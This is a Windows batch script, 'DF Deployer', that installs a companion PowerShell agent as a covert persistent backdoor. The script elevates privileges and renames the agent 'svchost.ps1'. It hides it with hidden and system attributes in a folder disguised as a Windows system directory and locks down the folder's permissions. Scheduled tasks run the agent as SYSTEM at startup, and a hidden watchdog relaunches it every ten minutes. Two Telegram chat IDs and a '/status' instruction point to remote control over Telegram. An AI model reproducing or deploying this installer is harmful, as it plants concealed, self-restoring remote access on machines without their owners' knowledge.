@echo off
setlocal EnableExtensions
title DF Deployer

if /i "%~1"=="__go" goto :run
cmd /k ""%~f0" __go"
exit /b

:run
cls
echo ============================================================
echo   DF Deployer
echo ============================================================
echo.

net session >nul 2>&1
if errorlevel 1 (
    echo [*] Elevating...
    powershell -NoProfile -Command "Start-Process -FilePath '%~f0' -ArgumentList '__go' -Verb RunAs"
    exit /b
)
echo [OK] Administrator

set "SRC=%~dp0agent.ps1"
if not exist "%SRC%" (
    echo [FAIL] agent.ps1 not found next to Deploy.bat
    pause
    exit /b 1
)

set "AGENT_DIR=%LOCALAPPDATA%\Microsoft\Windows\SystemData"
set "AGENT_PS=%AGENT_DIR%\svchost.ps1"
set "WATCH_PS=%AGENT_DIR%\watch.ps1"
set "HOSTS_FILE=%AGENT_DIR%\hosts.txt"
set "TASK_AGENT=WindowsSystemDataAgent"
set "TASK_WATCH=WindowsSystemDataWatch"

echo [*] Stopping old instance...
schtasks /Delete /TN "%TASK_AGENT%" /F >nul 2>&1
schtasks /Delete /TN "%TASK_WATCH%" /F >nul 2>&1
powershell -NoProfile -Command "Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" | Where-Object { $_.CommandLine -like '*svchost.ps1*' -or $_.CommandLine -like '*watch.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }" >nul 2>&1
timeout /t 2 /nobreak >nul

echo [*] Preparing directory...
if not exist "%AGENT_DIR%" mkdir "%AGENT_DIR%"
if not exist "%AGENT_DIR%" ( echo [FAIL] Cannot create %AGENT_DIR% & pause & exit /b 1 )

:: Unlock any existing files (hidden+system, SYSTEM-owned)
attrib -h -s -r "%AGENT_DIR%" >nul 2>&1
attrib -h -s -r "%AGENT_PS%" >nul 2>&1
attrib -h -s -r "%WATCH_PS%" >nul 2>&1
takeown /f "%AGENT_DIR%" /r /d Y >nul 2>&1
icacls "%AGENT_DIR%" /grant "*S-1-5-32-544:(OI)(CI)F" /T /C >nul 2>&1
icacls "%AGENT_DIR%" /grant "*S-1-5-18:(OI)(CI)F" /T /C >nul 2>&1

echo [*] Copying agent.ps1 ...
del /f /q "%AGENT_PS%" >nul 2>&1
copy /y "%SRC%" "%AGENT_PS%" >nul
if not exist "%AGENT_PS%" ( echo [FAIL] Copy failed ^(agent.ps1^) & pause & exit /b 1 )

echo [*] Writing watcher.ps1 ...
del /f /q "%WATCH_PS%" >nul 2>&1
> "%WATCH_PS%" echo $ag = '%AGENT_PS%'
>>"%WATCH_PS%" echo $run = $false
>>"%WATCH_PS%" echo try { Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" ^| ForEach-Object { if ($_.CommandLine -like "*$ag*") { $run = $true } } } catch {}
>>"%WATCH_PS%" echo if (-not $run) { Start-Process -FilePath 'powershell.exe' -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ag`"" -WindowStyle Hidden }
if not exist "%WATCH_PS%" ( echo [FAIL] Watcher write failed & pause & exit /b 1 )

echo [*] Auto-seeding hosts.txt with local hostname...
if not exist "%HOSTS_FILE%" (
    > "%HOSTS_FILE%" echo %COMPUTERNAME%
    echo [OK] hosts.txt = %COMPUTERNAME%
) else (
    echo [OK] hosts.txt already exists
)

echo [*] Validating agent.ps1 syntax ...
powershell -NoProfile -Command "$e=$null; [void][System.Management.Automation.Language.Parser]::ParseFile('%AGENT_PS%',[ref]$null,[ref]$e); if($e){$e|ForEach-Object{'LINE ' + $_.Extent.StartLineNumber + ': ' + $_.Message}; exit 1}"
if errorlevel 1 ( echo [FAIL] Syntax errors ^(see above^) & pause & exit /b 1 )
echo [OK] Syntax OK

echo [*] Locking down permissions...
icacls "%AGENT_DIR%" /inheritance:r >nul 2>&1
icacls "%AGENT_DIR%" /grant "*S-1-5-18:(OI)(CI)F" >nul 2>&1
icacls "%AGENT_DIR%" /grant "*S-1-5-32-544:(OI)(CI)F" >nul 2>&1
attrib +h +s "%AGENT_DIR%" >nul 2>&1
attrib +h +s "%AGENT_PS%"  >nul 2>&1
attrib +h +s "%WATCH_PS%"  >nul 2>&1

echo [*] Registering scheduled tasks ...
schtasks /Create /TN "%TASK_AGENT%" /TR "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%AGENT_PS%\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul
if errorlevel 1 ( echo [FAIL] Could not create %TASK_AGENT% & pause & exit /b 1 )
schtasks /Create /TN "%TASK_WATCH%" /TR "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%WATCH_PS%\"" /SC MINUTE /MO 10 /RU "SYSTEM" /RL HIGHEST /F >nul
if errorlevel 1 ( echo [FAIL] Could not create %TASK_WATCH% & pause & exit /b 1 )
echo [OK] Tasks registered

echo [*] Starting agent via scheduled task ^(SYSTEM^) ...
schtasks /Run /TN "%TASK_AGENT%" >nul 2>&1
timeout /t 6 /nobreak >nul

echo [*] Verifying ...
set "RUNNING=NO"
for /f "delims=" %%a in ('powershell -NoProfile -Command "$c=Get-CimInstance Win32_Process -Filter \"Name='powershell.exe'\" ^| Where-Object { $_.CommandLine -like '*svchost.ps1*' } ^| Measure-Object; if($c.Count -gt 0){'YES'}else{'NO'}"') do set "RUNNING=%%a"

echo.
echo ============================================================
if /i "%RUNNING%"=="YES" (echo  [SUCCESS] Agent is running) else (echo  [WARN] Agent not detected - check log)
echo ============================================================
echo  Agent : %AGENT_PS%
echo  Watch : %WATCH_PS%
echo  Hosts : %HOSTS_FILE%
echo  Chats : 6716357143 / 8546050060
echo ============================================================
echo.
echo  Send /status on Telegram to test.
echo.
pause
exit /b 0